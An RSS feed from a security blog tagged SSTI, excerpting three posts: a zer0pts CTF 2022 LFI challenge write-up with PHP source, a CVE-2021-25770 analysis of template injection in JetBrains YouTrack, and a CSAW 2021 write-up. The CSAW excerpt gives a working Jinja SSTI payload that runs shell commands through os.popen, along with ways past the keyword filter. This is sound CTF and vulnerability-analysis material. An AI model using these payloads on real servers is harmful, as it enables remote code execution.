<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>d@rkmod3</title>
    <link>/tags/ssti/</link>
    <description></description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 21 Mar 2022 00:00:00 +0000</lastBuildDate><atom:link href="/tags/ssti/index.xml" rel="self" type="application/rss+xml" />
      <item>
        <title>zer0pts CTF 2022</title>
        <link>/posts/zer0ptsctf_2022/</link>
        <pubDate>Mon, 21 Mar 2022 00:00:00 +0000</pubDate>
        
        <guid>/posts/zer0ptsctf_2022/</guid>
        <description>GitFile Explorer Type: LFI // index.php function h($s) { return htmlspecialchars($s); } function craft_url($service, $owner, $repo, $branch, $file) { if (strpos($service, &amp;#34;github&amp;#34;) !== false) { /* GitHub URL */ return $service.&amp;#34;/&amp;#34;.$owner.&amp;#34;/&amp;#34;.$repo.&amp;#34;/&amp;#34;.$branch.&amp;#34;/&amp;#34;.$file; } else if (strpos($service, &amp;#34;gitlab&amp;#34;) !== false) { /* GitLab URL */ return $service.&amp;#34;/&amp;#34;.$owner.&amp;#34;/&amp;#34;.$repo.&amp;#34;/-/raw/&amp;#34;.$branch.&amp;#34;/&amp;#34;.$file; } else if (strpos($service, &amp;#34;bitbucket&amp;#34;) !== false) { /* BitBucket URL */ return $service.&amp;#34;/&amp;#34;.$owner.&amp;#34;/&amp;#34;.$repo.&amp;#34;/raw/&amp;#34;.$branch.&amp;#34;/&amp;#34;.$file; } return null; } $service = empty($_GET[&amp;#39;service&amp;#39;]) ? &amp;#34;&amp;#34; : $_GET[&amp;#39;service&amp;#39;]; $owner = empty($_GET[&amp;#39;owner&amp;#39;]) ?</description>
      </item>
    
      <item>
        <title>CVE-2021-25770 Alnalysis | SSTI in JetBrains YouTrack</title>
        <link>/posts/cve-2021-25770/</link>
        <pubDate>Thu, 16 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>/posts/cve-2021-25770/</guid>
        <description>Summary In JetBrains YouTrack before 2020.5.3123, server-side template injection (SSTI) was possible, which could lead to code execution.
This server using framework freemarker to render template. Attacker can take advantage of assign (Directive Reference ) to set a new variable with value is defined class (ex: freemarker.template.utility.Execute) and this will lead to RCE (Remote code execution).
Severity: CRITICAL
Patch Download 2 version 2020.5.2579 (vulnerable) and 2020.5.3123 (patched) from this page.</description>
      </item>
    
      <item>
        <title>CSAW - 2021</title>
        <link>/posts/csaw/</link>
        <pubDate>Tue, 14 Sep 2021 13:13:43 +0700</pubDate>
        
        <guid>/posts/csaw/</guid>
        <description>Ninja Type: SSTI I test value param with {{7*7}} and it returns 49.
http://web.chal.csaw.io:5000/submit?value={{7*7}} RCE steps {{request.application.__globals__.__builtins__.__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;ls -la&amp;#39;).read()}} This payload import class os and executes ls -la from popen. Send this payload and we get the response:
Sorry, the following keywords/characters are not allowed :- _ ,config ,os, RUNCMD, base It&amp;rsquo;s not hard to bypass this filters
With _ we can bypass by \x5f (hex encode) With os we can bypass by \x6f\x73 With .</description>
      </item>
    
  </channel>
</rss>